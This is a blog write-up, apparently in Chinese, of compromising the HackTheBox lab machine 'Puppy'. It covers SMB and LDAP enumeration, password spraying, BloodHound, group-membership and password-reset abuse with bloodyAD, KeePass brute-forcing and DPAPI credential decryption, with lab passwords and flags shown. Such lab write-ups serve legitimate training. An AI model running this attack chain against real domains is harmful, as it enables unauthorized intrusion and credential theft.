{"pageProps":{"postData":{"id":"HackTheBoxSeason8 - Puppy","contentHtml":"<h1>Season8 - Puppy</h1>\n<blockquote>\n<p><a href=\"https://app.hackthebox.com/machines/661\">https://app.hackthebox.com/machines/661</a> | <code>Medium</code></p>\n</blockquote>\n<p><strong>Machine Information：As is common in real life pentests, you will start the Puppy box with credentials for the following account: levi.james / KingofAkron2025!</strong></p>\n<p>账户：<strong>levi.james:KingofAkron2025!</strong></p>\n<h2>前期踩点</h2>\n<pre><code class=\"hljs language-bash\">➜  Puppy nmap -sT -min-rate 10000 -p- 10.10.11.70         \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-18 08:09 EDT\nNmap scan report <span class=\"hljs-keyword\">for</span> puppy.htb (10.10.11.70)\nHost is up (0.18s latency).\nNot shown: 65518 filtered tcp ports (no-response)\nPORT      STATE SERVICE\n53/tcp    open  domain\n88/tcp    open  kerberos-sec\n111/tcp   open  rpcbind\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n389/tcp   open  ldap\n445/tcp   open  microsoft-ds\n464/tcp   open  kpasswd5\n636/tcp   open  ldapssl\n2049/tcp  open  nfs\n3260/tcp  open  iscsi\n3268/tcp  open  globalcatLDAP\n3269/tcp  open  globalcatLDAPssl\n5985/tcp  open  wsman\n9389/tcp  open  adws\n49667/tcp open  unknown\n49670/tcp open  unknown\n49685/tcp open  unknown\n61851/tcp open  unknown\n61886/tcp open  unknown\n\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 95.27 seconds\n</code></pre>\n<p>没有 <code>Web</code> 端口</p>\n<pre><code class=\"hljs language-bash\">➜  Puppy nmap -sT -A -T4 -O -p 53,88,111,445,2049,3260 10.10.11.70\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-18 08:15 EDT\nNmap scan report <span class=\"hljs-keyword\">for</span> puppy.htb (10.10.11.70)\nHost is up (0.22s latency).\n\nBug <span class=\"hljs-keyword\">in</span> iscsi-info: no string output.\nPORT     STATE SERVICE       VERSION\n53/tcp   open  domain?\n88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server <span class=\"hljs-keyword\">time</span>: 2025-05-18 18:54:52Z)\n111/tcp  open  rpcbind       2-4 (RPC <span class=\"hljs-comment\">#100000)</span>\n| rpcinfo:\n|   program version    port/proto  service\n|   100000  2,3,4        111/tcp   rpcbind\n|   100000  2,3,4        111/tcp6  rpcbind\n|   100000  2,3,4        111/udp   rpcbind\n|   100000  2,3,4        111/udp6  rpcbind\n|   100003  2,3         2049/udp   nfs\n|   100003  2,3         2049/udp6  nfs\n|   100005  1,2,3       2049/udp   mountd\n|   100005  1,2,3       2049/udp6  mountd\n|   100021  1,2,3,4     2049/tcp   nlockmgr\n|   100021  1,2,3,4     2049/tcp6  nlockmgr\n|   100021  1,2,3,4     2049/udp   nlockmgr\n|   100021  1,2,3,4     2049/udp6  nlockmgr\n|   100024  1           2049/tcp   status\n|   100024  1           2049/tcp6  status\n|   100024  1           2049/udp   status\n|_  100024  1           2049/udp6  status\n445/tcp  open  microsoft-ds?\n2049/tcp open  nlockmgr      1-4 (RPC <span class=\"hljs-comment\">#100021)</span>\n3260/tcp open  iscsi?\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice <span class=\"hljs-built_in\">type</span>: general purpose\nRunning (JUST GUESSING): Microsoft Windows 2022 (89%)\nAggressive OS guesses: Microsoft Windows Server 2022 (89%)\nNo exact OS matches <span class=\"hljs-keyword\">for</span> host (<span class=\"hljs-built_in\">test</span> conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-security-mode:\n|   3:1:1:\n|_    Message signing enabled and required\n| smb2-time:\n|   <span class=\"hljs-built_in\">date</span>: 2025-05-18T18:57:23\n|_  start_date: N/A\n|_clock-skew: 6h39m12s\n\nTRACEROUTE (using proto 1/icmp)\nHOP RTT       ADDRESS\n1   254.01 ms 10.10.16.1\n2   254.12 ms puppy.htb (10.10.11.70)\n</code></pre>\n<h2>信息收集</h2>\n<p>因为我们有凭据所以直接去进行信息收集</p>\n<h3>SMB</h3>\n<pre><code class=\"hljs language-bash\">➜  Puppy  crackmapexec smb 10.10.11.70 -u levi.james -p <span class=\"hljs-string\">'KingofAkron2025!'</span>\nSMB         10.10.11.70     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)\nSMB         10.10.11.70     445    DC               [+] PUPPY.HTB\\levi.james:KingofAkron2025! \n</code></pre>\n<p><code>Dump</code> 用户信息</p>\n<pre><code class=\"hljs language-bash\">➜  Puppy crackmapexec smb 10.10.11.70 -u levi.james -p <span class=\"hljs-string\">'KingofAkron2025!'</span> -d PUPPY.HTB --<span class=\"hljs-built_in\">users</span>\nSMB         10.10.11.70     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)\nSMB         10.10.11.70     445    DC               [+] PUPPY.HTB\\levi.james:KingofAkron2025! \nSMB         10.10.11.70     445    DC               [+] Enumerated domain user(s)\nSMB         10.10.11.70     445    DC               PUPPY.HTB\\steph.cooper_adm               badpwdcount: 5 desc: \nSMB         10.10.11.70     445    DC               PUPPY.HTB\\steph.cooper                   badpwdcount: 5 desc: \nSMB         10.10.11.70     445    DC               PUPPY.HTB\\jamie.williams                 badpwdcount: 5 desc: \nSMB         10.10.11.70     445    DC               PUPPY.HTB\\adam.silver                    badpwdcount: 0 desc: \nSMB         10.10.11.70     445    DC               PUPPY.HTB\\ant.edwards                    badpwdcount: 0 desc: \nSMB         10.10.11.70     445    DC               PUPPY.HTB\\levi.james                     badpwdcount: 5 desc: \nSMB         10.10.11.70     445    DC               PUPPY.HTB\\krbtgt                         badpwdcount: 0 desc: Key Distribution Center Service Account\nSMB         10.10.11.70     445    DC               PUPPY.HTB\\Guest                          badpwdcount: 0 desc: Built-<span class=\"hljs-keyword\">in</span> account <span class=\"hljs-keyword\">for</span> guest access to the computer/domain\nSMB         10.10.11.70     445    DC               PUPPY.HTB\\Administrator                  badpwdcount: 0 desc: Built-<span class=\"hljs-keyword\">in</span> account <span class=\"hljs-keyword\">for</span> administering the computer/domain\n</code></pre>\n<p>SMBclient 查看共享文件夹</p>\n<pre><code class=\"hljs language-bash\">➜  Puppy smbclient -L 10.10.11.70 -U puppy.htb/levi.james%KingofAkron2025!\n\n        Sharename       Type      Comment\n        ---------       ----      -------\n        ADMIN$          Disk      Remote Admin\n        C$              Disk      Default share\n        DEV             Disk      DEV-SHARE <span class=\"hljs-keyword\">for</span> PUPPY-DEVS\n        IPC$            IPC       Remote IPC\n        NETLOGON        Disk      Logon server share \n        SYSVOL          Disk      Logon server share \nReconnecting with SMB1 <span class=\"hljs-keyword\">for</span> workgroup listing.\ndo_connect: Connection to 10.10.11.70 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)\nUnable to connect with SMB1 -- no workgroup available\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Puppy smbclient //10.10.11.70/SYSVOL -U puppy.htb/levi.james%KingofAkron2025!\nTry <span class=\"hljs-string\">\"help\"</span> to get a list of possible commands.\nsmb: \\> <span class=\"hljs-built_in\">ls</span>\n  .                                   D        0  Fri Mar 21 01:33:44 2025\n  ..                                  D        0  Wed Feb 19 06:44:57 2025\n  lvRxjnmZBA                          D        0  Fri Mar 21 01:33:44 2025\n  PUPPY.HTB                          Dr        0  Wed Feb 19 06:44:57 2025\n  UltFsQYRGg.txt                      A        0  Fri Mar 21 01:33:44 2025\n\n                5080575 blocks of size 4096. 1544518 blocks available\n</code></pre>\n<p>将上面获取到的用户信息将用户名截取下来</p>\n<pre><code class=\"hljs language-bash\">➜  Puppy <span class=\"hljs-built_in\">cat</span> data.txt | awk <span class=\"hljs-string\">'{print $5}'</span> | awk -F<span class=\"hljs-string\">'\\'</span> <span class=\"hljs-string\">'{print $2}'</span>\nsteph.cooper_adm\nsteph.cooper\njamie.williams\nadam.silver\nant.edwards\nlevi.james\nkrbtgt\nGuest\nAdministrator\n</code></pre>\n<p>使用 <code>crackmapexec</code> 进行密码喷洒，结果依旧是只有 <code>levi.james</code> 用户</p>\n<pre><code class=\"hljs language-bash\">➜  Puppy crackmapexec smb 10.10.11.70 -u user.txt -p <span class=\"hljs-string\">'KingofAkron2025!'</span> -d PUPPY.HTB             \nSMB         10.10.11.70     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)\nSMB         10.10.11.70     445    DC               [-] PUPPY.HTB\\steph.cooper_adm:KingofAkron2025! STATUS_LOGON_FAILURE \nSMB         10.10.11.70     445    DC               [-] PUPPY.HTB\\steph.cooper:KingofAkron2025! STATUS_LOGON_FAILURE \nSMB         10.10.11.70     445    DC               [-] PUPPY.HTB\\jamie.williams:KingofAkron2025! STATUS_LOGON_FAILURE \nSMB         10.10.11.70     445    DC               [-] PUPPY.HTB\\adam.silver:KingofAkron2025! STATUS_LOGON_FAILURE \nSMB         10.10.11.70     445    DC               [-] PUPPY.HTB\\ant.edwards:KingofAkron2025! STATUS_LOGON_FAILURE \nSMB         10.10.11.70     445    DC               [+] PUPPY.HTB\\levi.james:KingofAkron2025! \n</code></pre>\n<h3>HoundBlood</h3>\n<p>使用 <code>bloodhound-python</code> 来获取数据</p>\n<pre><code class=\"hljs language-bash\">➜  Puppy bloodhound-python -u <span class=\"hljs-string\">'levi.james'</span> -p <span class=\"hljs-string\">'KingofAkron2025!'</span> -d <span class=\"hljs-string\">'puppy.htb'</span> -ns 10.10.11.70 --zip -c All -dc <span class=\"hljs-string\">'DC.PUPPY.HTB'</span>\nINFO: Found AD domain: puppy.htb\nINFO: Getting TGT <span class=\"hljs-keyword\">for</span> user\nWARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)\nINFO: Connecting to LDAP server: DC.PUPPY.HTB\nINFO: Found 1 domains\nINFO: Found 1 domains <span class=\"hljs-keyword\">in</span> the forest\nINFO: Found 1 computers\nINFO: Connecting to LDAP server: DC.PUPPY.HTB\nINFO: Found 10 <span class=\"hljs-built_in\">users</span>\nINFO: Found 56 <span class=\"hljs-built_in\">groups</span>\nINFO: Found 3 gpos\nINFO: Found 3 ous\nINFO: Found 19 containers\nINFO: Found 0 trusts\nINFO: Starting computer enumeration with 10 workers\nINFO: Querying computer: DC.PUPPY.HTB\nINFO: Done <span class=\"hljs-keyword\">in</span> 00M 31S\nINFO: Compressing output into 20250518084406_bloodhound.zip\n</code></pre>\n<p>用户 <code>levi.james</code> 的信息</p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Puppy/image.png\" alt=\"image.png\"></p>\n<p>所属组以及拥有的修改权限</p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Puppy/image1.png\" alt=\"image.png\"></p>\n<p>用户 <code>levi.james</code> 对 <code>DEVELOPERS</code> 组拥有 <code>GenericAll</code> 权限，并且有三个用户属于<code>DEVELOPERS</code> 组</p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Puppy/image2.png\" alt=\"image.png\"></p>\n<p>其中下一个目标用户可能就是 <code>ANT.EDWARDS</code>  或者 <code>ADAM.SILVER</code></p>\n<p><code>ANT.EDWARDS</code> 可以控制 <code>ADAM.SILVER</code>，<code>ADAM.SILVER</code> 是远程组成员</p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Puppy/image3.png\" alt=\"image.png\"></p>\n<p>我们给 <code>levi.james</code> 添加到 <code>DEVELPOERS</code> 组内</p>\n<pre><code class=\"hljs language-bash\">➜  Puppy bloodyAD -d puppy.htb -u levi.james -p KingofAkron2025! --dc-ip 10.10.11.70 add groupMember DEVELOPERS levi.james\n[+] levi.james added to DEVELOPERS\n</code></pre>\n<p>然后上面<code>SMB</code>共享文件夹中的<code>DEV</code>加入组后再查看一次，可以访问了（未加入组之前是空的），将所有文件都拉取下来</p>\n<pre><code class=\"hljs language-bash\">➜  Puppy smbclient //10.10.11.70/DEV -U puppy.htb/levi.james%KingofAkron2025!\nTry <span class=\"hljs-string\">\"help\"</span> to get a list of possible commands.\nsmb: \\> <span class=\"hljs-built_in\">ls</span>\n  .                                  DR        0  Sun Mar 23 03:07:57 2025\n  ..                                  D        0  Sat Mar  8 11:52:57 2025\n  KeePassXC-2.7.9-Win64.msi           A 34394112  Sun Mar 23 03:09:12 2025\n  Projects                            D        0  Sat Mar  8 11:53:36 2025\n  recovery.kdbx                       A     2677  Tue Mar 11 22:25:46 2025\n\n                5080575 blocks of size 4096. 1543255 blocks available\nsmb: \\> mget *\nGet file KeePassXC-2.7.9-Win64.msi? <span class=\"hljs-built_in\">yes</span>\ngetting file \\KeePassXC-2.7.9-Win64.msi of size 34394112 as KeePassXC-2.7.9-Win64.msi (1339.5 KiloBytes/sec) (average 1339.5 KiloBytes/sec)\nGet file recovery.kdbx? <span class=\"hljs-built_in\">yes</span>\n</code></pre>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Puppy/image4.png\" alt=\"image.png\"></p>\n<h3>kdbx 破解</h3>\n<p>其中 <code>kdbx</code> 是 <code>KeePass</code> 的文件，需要密码才能解开</p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Puppy/image5.png\" alt=\"image.png\"></p>\n<p>这里使用项目：<a href=\"https://github.com/r3nt0n/keepass4brute\">https://github.com/r3nt0n/keepass4brute</a></p>\n<p>使用之前需要安装依赖：</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-built_in\">sudo</span> apt install keepassxc\n</code></pre>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Puppy/image6.png\" alt=\"image.png\"></p>\n<p>得到密码 <code>livepool</code></p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Puppy/image7.png\" alt=\"image.png\"></p>\n<p>解密后得到五个用户的账号密码</p>\n<pre><code class=\"hljs language-bash\">ADAM.SILVER:ADAM.SILVER:HJKL2025!\nANTONY C.EDWARDS:ANT.EDWARDS:Antman2025!\nJAMIE WILLIAMSON:JAMIE.WILLIAMSON:JamieLove2025!\nSAMUEL BLAKE:ILY2025!\nSTEVE TUCKER:Steve2025!\n</code></pre>\n<h2>To Adam.Silver</h2>\n<p>这里使用 <code>ADAM.SILVER</code> 的用户凭据却无法进行登录</p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Puppy/image8.png\" alt=\"image.png\"></p>\n<p>因为 <code>ANT.EDWARDS</code> 对其拥有 <code>GenericALL</code> 权限，尝试修改其密码再进行登录</p>\n<pre><code class=\"hljs language-bash\">➜  Puppy ntpdate -s 10.10.11.70 | bloodyAD -d puppy.htb -u ant.edwards -p Antman2025! --dc-ip 10.10.11.70 <span class=\"hljs-built_in\">set</span> password adam.silver Passwords123!\n[+] Password changed successfully!\n</code></pre>\n<p>再使用 <code>winrm</code> 进行登录</p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Puppy/image9.png\" alt=\"image.png\"></p>\n<p>读取 <code>user.txt</code></p>\n<pre><code class=\"hljs language-bash\">*Evil-WinRM* PS C:\\Users\\adam.silver\\Desktop> <span class=\"hljs-built_in\">cat</span> user.txt\nbc5937245feb2b2c7101f1a54c4ecf4a\n</code></pre>\n<p>寻找一下信息</p>\n<p><code>backups</code> 目录下有一个压缩包</p>\n<pre><code class=\"hljs language-bash\">*Evil-WinRM* PS C:\\Backups> <span class=\"hljs-built_in\">ls</span>\n\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\n-a----          3/8/2025   8:22 AM        4639546 site-backup-2024-12-30.zip\n\n*Evil-WinRM* PS C:\\Backups> download site-backup-2024-12-30.zip\nInfo: Downloading C:\\Backups\\site-backup-2024-12-30.zip to site-backup-2024-12-30.zip\n                                        \nInfo: Download successful!\n</code></pre>\n<p>解压后能找到一个文件 <code>nms-auth-config.xml.bak</code></p>\n<pre><code class=\"hljs language-bash\">&#x3C;?xml version=<span class=\"hljs-string\">\"1.0\"</span> encoding=<span class=\"hljs-string\">\"UTF-8\"</span>?>\n&#x3C;ldap-config>\n    &#x3C;server>\n        &#x3C;host>DC.PUPPY.HTB&#x3C;/host>\n        &#x3C;port>389&#x3C;/port>\n        &#x3C;base-dn>dc=PUPPY,dc=HTB&#x3C;/base-dn>\n        &#x3C;bind-dn>cn=steph.cooper,dc=puppy,dc=htb&#x3C;/bind-dn>\n        &#x3C;bind-password>ChefSteph2025!&#x3C;/bind-password>\n......\n</code></pre>\n<h2>To Steph.cooper_adm</h2>\n<p>里面是 <code>steph.cooper</code> 的密码，使用<code>HoundBlood</code>查看一下其信息</p>\n<p>注意到 <code>steph.cooper</code> 属于 <code>PUPPY ADMINS</code></p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Puppy/image10.png\" alt=\"image.png\"></p>\n<p>并且 <code>steph.cooper</code> 也是属于远程管理组的</p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Puppy/image11.png\" alt=\"image.png\"></p>\n<p>使用 <code>winrm</code> 进行登录</p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Puppy/image12.png\" alt=\"image.png\"></p>\n<p>上传 <code>Winpeas</code> 进行信息收集</p>\n<pre><code class=\"hljs language-bash\">*Evil-WinRM* PS C:\\Users\\steph.cooper\\documents> ./winPEAS.exe > result.txt\n*Evil-WinRM* PS C:\\Users\\steph.cooper\\documents> download result.txt\n                                        \nInfo: Downloading C:\\Users\\steph.cooper\\documents\\result.txt to result.txt                                       \nInfo: Download successful!\n</code></pre>\n<h3>DPAPI</h3>\n<p>经过提示说要使用 <code>DPAPI</code> ，并且在 <code>Winpeas</code> 中也能扫描到</p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Puppy/image13.png\" alt=\"image.png\"></p>\n<p>首先将 <code>DPAPI</code>下载下来</p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Puppy/image14.png\" alt=\"image.png\"></p>\n<p>再下载受 <code>DPAPI</code> 保护的数据的隐藏文件</p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Puppy/image15.png\" alt=\"image.png\"></p>\n<p>获取解密密钥</p>\n<pre><code class=\"hljs language-bash\">➜  Puppy dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 -sid S-1-5-21-1487982659-1829050783-2281216199-1107 -password <span class=\"hljs-string\">'ChefSteph2025!'</span>\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[MASTERKEYFILE]\nVersion     :        2 (2)\nGuid        : 556a2412-1275-4ccf-b721-e6a0b4f90407\nFlags       :        0 (0)\nPolicy      : 4ccf1275 (1288639093)\nMasterKeyLen: 00000088 (136)\nBackupKeyLen: 00000068 (104)\nCredHistLen : 00000000 (0)\nDomainKeyLen: 00000174 (372)\n\nDecrypted key with User Key (MD4 protected)\nDecrypted key: 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84\n</code></pre>\n<p>使用解密密钥解密搜保护的文件</p>\n<pre><code class=\"hljs language-bash\">➜  Puppy dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[CREDENTIAL]\nLastWritten : 2025-03-08 15:54:29\nFlags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)\nPersist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)\nType        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)\nTarget      : Domain:target=PUPPY.HTB\nDescription : \nUnknown     : \nUsername    : steph.cooper_adm\nUnknown     : FivethChipOnItsWay2025!\n</code></pre>\n<p>得到 <code>steph.cooper_adm</code> 的密码 <code>FivethChipOnItsWay2025!</code></p>\n<p>使用 <code>evil-winrm</code> 登录即可</p>\n<pre><code class=\"hljs language-bash\">➜  Puppy evil-winrm -i 10.10.11.70 -u steph.cooper_adm -p FivethChipOnItsWay2025!\n                                        \nEvil-WinRM shell v3.7\n                                        \nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class=\"hljs-keyword\">function</span> is unimplemented on this machine\n                                        \nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n                                        \nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\steph.cooper_adm\\Documents> \n</code></pre>\n<p><code>root.txt</code></p>\n<pre><code class=\"hljs language-bash\">*Evil-WinRM* PS C:\\Users\\administrator\\desktop> <span class=\"hljs-built_in\">cat</span> root.txt\n1e994f1731e5342bb080a9b7eea4f1a6\n</code></pre>\n<h2>总结</h2>\n<p>第一次打没有 <code>Web</code> 的靶机，涉及到的新知识点也很少。这还是第一次是使用<code>DPAPI</code> ，这次也将其作了解了。</p>","title":"HackTheBox - Season8 - Puppy","date":"2025-05-19","updated":"2025-05-19","tags":["HackTheBox","Windows靶机","域渗透","DPAPI","Keepass","encrypt"],"categories":"靶机","comments":true,"description":"Season8 - Puppy\n\n https://app.hackthebox.com/machines/661 | `Medium`\n \n\nMachine Information：As is common in real life pentests, you will start the Puppy box with credentials for the following account:...","isEncrypted":true},"recentPosts":[{"id":"TheHackersLabsBlackGold","title":"TheHackersLabs - BlackGold","date":"2025-07-15","isEncrypted":false,"year":"2025","month":"07","day":"15"},{"id":"TheHackersLabsSedition","title":"TheHackersLabs - Sedition","date":"2025-07-14","isEncrypted":false,"year":"2025","month":"07","day":"14"},{"id":"HackMyVMXimai","title":"HackMyVM - Ximai","date":"2025-07-14","isEncrypted":false,"year":"2025","month":"07","day":"14"},{"id":"HackTheBoxSeason8 - Outbound","title":"HackTheBox - Season8 - Outbound","date":"2025-07-13","isEncrypted":true,"year":"2025","month":"07","day":"13"},{"id":"HackTheBoxSeason8 - Voleur","title":"HackTheBox - Season8 - Voleur","date":"2025-07-07","isEncrypted":true,"year":"2025","month":"07","day":"07"},{"id":"TryHackMeCreative","title":"TryHackMe - Creative","date":"2025-07-05","isEncrypted":false,"year":"2025","month":"07","day":"05"},{"id":"HackTheBoxSeason8 - RustyKey","title":"HackTheBox - Season8 - RustyKey","date":"2025-06-30","isEncrypted":true,"year":"2025","month":"06","day":"30"}]},"__N_SSG":true}